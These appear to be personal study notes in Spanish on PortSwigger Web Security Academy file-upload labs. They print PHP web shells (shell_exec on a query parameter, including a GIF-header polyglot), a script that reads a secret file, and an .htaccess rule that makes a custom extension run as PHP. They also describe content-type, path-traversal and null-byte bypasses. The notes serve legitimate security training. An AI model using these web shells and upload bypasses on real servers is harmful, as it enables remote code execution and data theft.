1. En el perfil hay una opcion de cambiar el avatar la cual acepta archivos php, montamos un script rapido para leer el contenido del directorio:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
- Y visitamos la ruta donde se encuentran los avatares junto con el nombre del archivo (la ruta la podemos sacar haciendo hovering en la imagen en nuestro perfil):

![[Pasted image 20260801213059.png|379]]

https://0a5500f7035773cc824951dc00ce0028.web-security-academy.net/files/avatars/shell.php

- Tambien podriamos spawnear una shell y concatenarle en la query string el comando que queramos ejecutar:
![[Pasted image 20260801212946.png|257]]

```php
<?php 
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; 
?>
```

2. Mismo que el anterior pero era necesario cambiar el content type a uno permitido (como jpeg o png):
![[Pasted image 20260803200614.png|465]]
![[Pasted image 20260803200646.png|688]]

3. El directorio files/avatars no acepta codigo php, asi que hacemos path traversal a otra ruta y ahi probamos de nuevo ('/' URL encodeado es %2f):
![[Pasted image 20260803201332.png|255]]

4. Estaba bloqueada la extension .php, asi que creamos un '.htaccess' y en él indicamos que todos los archivos con extensión .bg3z queremos que nos los interprete como .php:

![[Pasted image 20260803202834.png|197]]
```.htaccess
AddType application/x-httpd-php .bg3z
```
![[Pasted image 20260803202932.png]]

5. Usamos un byte nulo para separar la extension veridica de la bait extension:
![[Pasted image 20260803203550.png|279]]

6. {POLYGOT: Tipo de archivo que es valido como uno o varios tipos de archivo}
	*  Para determinar el tipo de un archivo, los sistemas operativos suelen leer los primeros X bytes para determinarlo (https://en.wikipedia.org/wiki/List_of_file_signatures), entonces poniendo como primera linea la firma de un .gif, hacemos que para el SO, sea un gif pero se ejecute como un .php

```php
GIF8;
<?php 
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; 
?>
```
![[Pasted image 20260803204258.png]]